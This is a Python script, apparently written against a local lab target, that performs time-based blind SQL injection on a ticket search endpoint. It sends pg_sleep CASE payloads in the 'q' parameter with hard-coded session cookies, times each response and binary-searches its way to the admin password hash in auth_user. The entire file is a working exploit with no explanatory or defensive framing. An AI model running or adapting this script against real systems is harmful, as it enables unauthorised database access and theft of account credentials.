import requests
import time

BASE_URL = "http://127.0.0.1:5001/tickets/search/"

COOKIES = {
     "sessionid": "obv5btml49twkbe5uo5zyki5ot4ktf94",
     "csrftoken": "etaSGcLk32vmOSZXIYHuVq9LmgQdnhQ5",
}

SLEEP_TIME = 2          
THRESHOLD = 1.5        
ANCHOR = "password"     

def timing_oracle(condition_sql):
  
    payload = (
        f"{ANCHOR}%' AND CASE WHEN ({condition_sql}) "
        f"THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END IS NULL--"
    )
    params = {"q": payload}
    start = time.time()
    requests.get(BASE_URL, params=params, cookies=COOKIES)
    elapsed = time.time() - start
    return elapsed > THRESHOLD

def get_length(subquery):
    low, high = 0, 200
    while low < high:
        mid = (low + high) // 2
        cond = f"(SELECT length({subquery})) > {mid}"
        if timing_oracle(cond):
            low = mid + 1
        else:
            high = mid
    return low

def get_char(subquery, position):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        cond = f"(SELECT ascii(substring({subquery},{position},1))) > {mid}"
        if timing_oracle(cond):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def extract_string(subquery):
    length = get_length(subquery)
    print(f"[+] Length: {length}")
    result = ""
    for pos in range(1, length + 1):
        c = get_char(subquery, pos)
        result += c
        print(f"[+] Position {pos}: '{c}' -> so far: {result}")
    return result

if __name__ == "__main__":
    subquery = "(SELECT password FROM auth_user WHERE username='admin')"
    hash_value = extract_string(subquery)
    print("\n RECOVERED HASH (TIME-BASED)")
    print(hash_value)